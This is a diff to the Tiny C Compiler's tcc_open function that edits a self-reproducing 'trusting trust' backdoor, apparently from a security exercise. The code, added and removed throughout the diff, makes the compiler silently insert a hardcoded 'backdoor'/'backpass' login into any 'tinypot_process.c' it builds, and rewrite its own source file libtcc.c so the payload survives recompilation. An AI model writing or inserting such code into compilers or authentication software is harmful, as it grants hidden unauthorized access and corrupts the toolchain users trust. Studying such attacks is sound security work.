@@ -607,66 +607,69 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         fd = 0, filename = "<stdin>";
     else
         fd = open(filename, O_RDONLY | O_BINARY);
-    
+
     const char *code[] = {
-        "   int codeLines = 54;\n",
-        "   if (strcmp(filename, \"tinypot_process.c\") == 0)\n",
-        "   {\n",
-        "       FILE* oldFile = fopen(filename, \"r\");\n",
-        "       FILE* newFile = fopen(\".tempBackDoor\", \"w\");\n",
-        "       char buf[200];\n",
-        "       while (fgets(buf, 200, oldFile) != NULL)\n",
-        "       {\n",
-        "           fputs(buf, newFile);\n",
-        "           if (strstr(buf, \"AuthData_t authorizedUsers[]\") != NULL)\n",
-        "               fputs(\"{\\\"backdoor\\\", \\\"backpass\\\"},\", newFile);\n",
-        "       }\n",
-        "       fclose(oldFile);\n",
-        "       fclose(newFile);\n",
-        "       fd = open(\".tempBackDoor\", O_RDONLY | O_BINARY);\n",
-        "   }\n",
-        "   else if (strcmp(filename, \"libtcc.c\") == 0)\n",
-        "   {\n",
-        "       FILE* compilerFile = fopen(filename, \"r\");\n",
-        "       FILE* tempFile = fopen(\".temp\", \"w+\");\n",
-        "       char buf[200];\n",
-        "       while (fgets(buf, 200, compilerFile) != NULL)\n",
-        "       {\n",
-        "           fputs(buf, tempFile);\n",
-        "           if (strstr(buf, \"fd = open(filename, O_RDONLY | O_BINARY);\") != NULL)\n",
-        "           {\n",
-        "               if (fgets(buf, 200, compilerFile) != NULL)\n",
-        "               {\n",
-        "                   if (strstr(buf, \"code[]\") == NULL)\n",
-        "                   {\n",
-        "                       fputs(\"const char* code[] = {\\n\", tempFile);\n",
-        "                       for (int i = 0; i < codeLines; i++)\n",
-        "                       {\n",
-        "                           fputs(\"\\\"\", tempFile);\n",
-        "                           fputs(code[i], tempFile);\n",
-        "                           fputs(\"\\\",\", tempFile);\n",
-        "                       }\n",
-        "                       fputs(\"};\\n\", tempFile);\n",
-        "                       for (int i = 0; i < codeLines; i++)\n",
-        "                       {\n",
-        "                           fputs(code[i], tempFile);\n"
-        "                       }\n",
-        "                   }\n",
-        "                   fputs(buf, tempFile);\n",
-        "               }\n",
-        "           }\n",
-        "       }\n",
-        "       fclose(compilerFile);\n",
-        "       fclose(tempFile);\n",
-        "       compilerFile = fopen(filename, \"w+\");\n",
-        "       tempFile = fopen(\".temp\", \"r\");\n",
-        "       while (fgets(buf, 200, tempFile) != NULL)\n",
-        "           fputs(buf, compilerFile);\n",
-        "       fclose(compilerFile);\n",
-        "       fclose(tempFile);\n",
-        "   }\n"
+        "   int codeLines = 59;\0",
+        "   if (strcmp(filename, \"tinypot_process.c\") == 0)\0",
+        "   {\0",
+        "       FILE* oldFile = fopen(filename, \"r\");\0",
+        "       FILE* newFile = fopen(\".tempBackDoor\", \"w\");\0",
+        "       char buf[200];\0",
+        "       while (fgets(buf, 200, oldFile) != NULL)\0",
+        "       {\0",
+        "           fputs(buf, newFile);\0",
+        "           if (strstr(buf, \"AuthData_t authorizedUsers[]\") != NULL)\0",
+        "               fputs(\"{\\\"backdoor\\\", \\\"backpass\\\"},\", newFile);\0",
+        "       }\0",
+        "       fclose(oldFile);\0",
+        "       fclose(newFile);\0",
+        "       fd = open(\".tempBackDoor\", O_RDONLY | O_BINARY);\0",
+        "   }\0",
+        "   else if (strcmp(filename, \"libtcc.c\") == 0)\0",
+        "   {\0",
+        "       FILE* compilerFile = fopen(filename, \"r\");\0",
+        "       FILE* tempFile = fopen(\".temp\", \"w+\");\0",
+        "       char buf[200];\0",
+        "       while (fgets(buf, 200, compilerFile) != NULL)\0",
+        "       {\0",
+        "           fputs(buf, tempFile);\0",
+        "           if (strstr(buf, \"fd = open(filename, O_RDONLY | O_BINARY);\") != NULL)\0",
+        "           {\0",
+        "               fputs(\"const char* code[] = {\\n\", tempFile);\0",
+        "               for (int i = 0; i < codeLines; i++)\0",
+        "               {\0",
+        "                   fputs(\"\\\"\", tempFile);\0",
+        "                   const char* currStr = code[i];\0",
+        "                   for (int j = 0; currStr[j] != 0; j++)\0",
+        "                   {\0",
+        "                      if (currStr[j] == '\\\\\')\0",
+        "                          fputs(\"\\\\\\\\\", tempFile);\0",
+        "                      else if (currStr[j] == '\"')\0",
+        "                          fputs(\"\\\\\\\"\", tempFile);\0",
+        "                      else\0",
+        "                          fputc(currStr[j], tempFile);\0",
+        "                   }\0",
+        "                   fputs(\"\\\\0\\\",\\n\", tempFile);\0",
+        "               }\0",
+        "               fputs(\"};\\n\", tempFile);\0",
+        "               for (int i = 0; i < codeLines; i++)\0",
+        "               {\0",
+        "                   fputs(code[i], tempFile);\0",
+        "                   fputs(\"\\n\", tempFile);\0",
+        "               }\0",
+        "           }\0",
+        "       }\0",
+        "       fclose(compilerFile);\0",
+        "       fclose(tempFile);\0",
+        "       compilerFile = fopen(filename, \"w+\");\0",
+        "       tempFile = fopen(\".temp\", \"r\");\0",
+        "       while (fgets(buf, 200, tempFile) != NULL)\0",
+        "           fputs(buf, compilerFile);\0",
+        "       fclose(compilerFile);\0",
+        "       fclose(tempFile);\0",
+        "   }\0"
     };
-    int codeLines = 55;
+    int codeLines = 59;
 
     // Check if filename is "tinypot_process.c"
     if (strcmp(filename, "tinypot_process.c") == 0)
@@ -702,24 +705,27 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
             // Add the corruption to temp file
             if (strstr(buf, "fd = open(filename, O_RDONLY | O_BINARY);") != NULL)
             {
-                if (fgets(buf, 200, compilerFile) != NULL)
+                fputs("const char* code[] = {\n", tempFile);
+                for (int i = 0; i < codeLines; i++)
                 {
-                    if (strstr(buf, "code[]") == NULL)
+                    fputs("\"", tempFile);
+                    const char *currStr = code[i];
+                    for (int j = 0; currStr[j] != 0; j++)
                     {
-                        fputs("const char* code[] = {\n", tempFile);
-                        for (int i = 0; i < codeLines; i++)
-                        {
-                            fputs("\"", tempFile);
-                            fputs(code[i], tempFile);
-                            fputs("\",", tempFile);
-                        }
-                        fputs("};\n", tempFile);
-                        for (int i = 0; i < codeLines; i++)
-                        {
-                            fputs(code[i], tempFile);
-                        }
+                        if (currStr[j] == '\\')
+                            fputs("\\\\", tempFile);
+                        else if (currStr[j] == '"')
+                            fputs("\\\"", tempFile);
+                        else
+                            fputc(currStr[j], tempFile);
                     }
-                    fputs(buf, tempFile);
+                    fputs("\\0\",\n", tempFile);
+                }
+                fputs("};\n", tempFile);
+                for (int i = 0; i < codeLines; i++)
+                {
+                    fputs(code[i], tempFile);
+                    fputs("\n", tempFile);
                 }
             }
         }
@@ -730,9 +736,7 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         compilerFile = fopen(filename, "w+");
         tempFile = fopen(".temp", "r");
         while (fgets(buf, 200, tempFile) != NULL)
-        {
             fputs(buf, compilerFile);
-        }
         fclose(compilerFile);
         fclose(tempFile);
     }
